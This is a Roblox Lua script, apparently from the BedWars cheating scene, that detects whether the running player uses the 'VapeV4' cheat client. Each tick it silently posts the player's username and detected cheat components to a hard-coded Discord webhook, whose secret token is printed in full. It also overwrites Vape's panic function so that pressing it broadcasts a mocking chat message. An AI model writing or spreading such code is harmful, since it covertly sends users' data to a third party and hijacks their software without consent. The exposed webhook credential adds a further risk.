repeat task.wait() until game:IsLoaded()
local bedwars = {
  url = "https://discord.com/api/webhooks/1113008147557261412/kX-Sv3eepvLZNb7oHvW1d4Q1MfqakPdSHKryEnEojxDf3Sx3wt4IZu3SMcT_h6gL3BOs",
  embed = {["content"] = "VapeV4 User Detected",["embeds"] = {{["title"] = "USERNAME",["description"] = "⬇️ Exploit Info ⬇️",["color"] = tonumber(0xFF0000),["fields"] = {}}}}
}
-- We will auto detect player usin vape and report it back to my main
local hp = game:GetService("HttpService")
local lplr = game:GetService("Players").LocalPlayer
local cc = true
local function check()
  if not shared.GuiLibrary then return end
  local gi = shared.GuiLibrary
  local el = shared.vapeentity
  local vti = shared.VapeTargetInfo
  local vwls = shared.vapewhitelist
  local uif = shared.vapeoverlay
  local vfl = shared.VapeFullyLoaded
  local vtm = shared.vapeteammembers or 0
  local dma = shared.damageanim
  local ggf = shared.ggfunction
  local n = bedwars.embed
  local x = n["embeds"][1]
  x.title = lplr.Name
  table.insert(x["fields"], {
      ["name"] = "Gui Library",
      ["value"] = gi ~= nil and "✅ Detected - "..tostring(gi) or "❌ Not Detected"
  })
  table.insert(x["fields"], {
      ["name"] = "Entity Library",
      ["value"] = el ~= nil and "✅ Detected - "..tostring(el) or "❌ Not Detected"
  })
  table.insert(x["fields"], {
      ["name"] = "Vape Target Info",
      ["value"] = vti ~= nil and "✅ Detected - "..tostring(vti) or "❌ Not Detected"
  })
  table.insert(x["fields"], {
      ["name"] = "Vape Whitelist Functions",
      ["value"] = vwls ~= nil and "✅ Detected - "..tostring(vwls) or "❌ Not Detected"
  })
  table.insert(x["fields"], {
      ["name"] = "Vape Info Overlay",
      ["value"] = uif ~= nil and "✅ Detected - "..tostring(uif) or "❌ Not Detected"
  })
  table.insert(x["fields"], {
      ["name"] = "Damage Animation",
      ["value"] = dma ~= nil and "✅ Detected - "..tostring(dma) or "❌ Not Detected"
  })
  table.insert(x["fields"], {
      ["name"] = "Boosting",
      ["value"] = vtm ~= 0 and "✅ Yes, Boosting Members Count: "..tostring(vtm) or "❌ No"
  })
  table.insert(x["fields"], {
      ["name"] = "GG Function",
      ["value"] = ggf ~= nil and "✅ Detected - "..tostring(ggf) or "❌ Not Detected"
  })
  local nx = hp:JSONEncode(n)
  hp:PostAsync(bedwars.url, nx)
end
while wait() do
  shared.GuiLibrary.SelfDestruct = function(any)
    return game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Sonicware - I'm trying to use panic but failed because it's restricted LOL", "ALL")
  end
  if cc == false then return end -- User Reported.
  check()
end